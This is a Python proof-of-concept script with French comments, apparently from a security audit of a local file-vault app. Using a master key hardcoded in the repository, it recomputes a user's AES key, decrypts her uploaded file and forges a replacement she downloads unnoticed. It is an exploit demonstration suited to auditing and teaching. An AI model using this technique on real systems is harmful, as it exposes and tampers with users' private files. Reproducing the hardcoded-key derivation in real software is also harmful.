"""PoC F2 : recalcul de la cle de chiffrement d'un utilisateur a partir du code source.

Lancement (depuis la racine coffre_fichiers/) :   python3 poc/f2.py
"""
import io
import os
import sys
import hashlib
from pathlib import Path

from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))
from app.app import app, STORAGE  # instance locale du service (meme processus)

# Ce que l'attaquant lit dans le depot Git (aucun import de app.crypto_utils) :
#   app/config.py, ligne 10       -> valeur de MASTER_KEY
#   app/crypto_utils.py, ligne 13 -> formule SHA256(MASTER_KEY + username)
MASTER_KEY_GIT = bytes.fromhex("6b1f0c3e9a7d4e2f8c5b1a0d3e6f9c2b")


def cle_utilisateur(username: str) -> bytes:
    return hashlib.sha256(MASTER_KEY_GIT + username.encode()).digest()


client = app.test_client()

# 1. Victime : alice cree son compte et depose un fichier (endpoints normaux)
client.post("/register", json={"username": "alice", "password": "motdepasse-alice"})
token = client.post("/login", json={"username": "alice", "password": "motdepasse-alice"}).get_json()["token"]
auth = {"Authorization": f"Bearer {token}"}
contenu = (ROOT_DIR / "exemples" / "rapport.txt").read_bytes()
r = client.post("/upload", headers=auth, content_type="multipart/form-data",
                data={"file": (io.BytesIO(contenu), "rapport.txt")})
file_id = r.get_json()["file_id"]
print(f"[victime] alice a depose {file_id}")

# 2. Attaquant : lecture de STORAGE (simule l'acces aux sauvegardes)
entree = STORAGE[file_id]
blob, victime = entree["blob"], entree["owner"]
print(f"[attaquant] blob vole : {blob.hex()[:48]}... (proprietaire : {victime})")

# 3. Recalcul de la cle et dechiffrement hors ligne
cle = cle_utilisateur(victime)
print(f"[attaquant] cle recalculee pour {victime} : {cle.hex()}")
try:
    clair = AESGCM(cle).decrypt(blob[:12], blob[12:], None)
except InvalidTag:
    sys.exit("[-] Echec : la cle recalculee est fausse (service corrige).")
assert clair == contenu
print("[+] Objectif 1 casse, contenu dechiffre :", clair.decode())

# 4. Falsification : l'attaquant ecrit dans STORAGE un contenu valide
faux = b"Rapport modifie par l'attaquant."
nonce = os.urandom(12)
STORAGE[file_id]["blob"] = nonce + AESGCM(cle).encrypt(nonce, faux, None)
recu = client.get(f"/download/{file_id}", headers=auth).data
assert recu == faux
print("[+] Objectif 2 casse, alice telecharge sans erreur :", recu.decode())
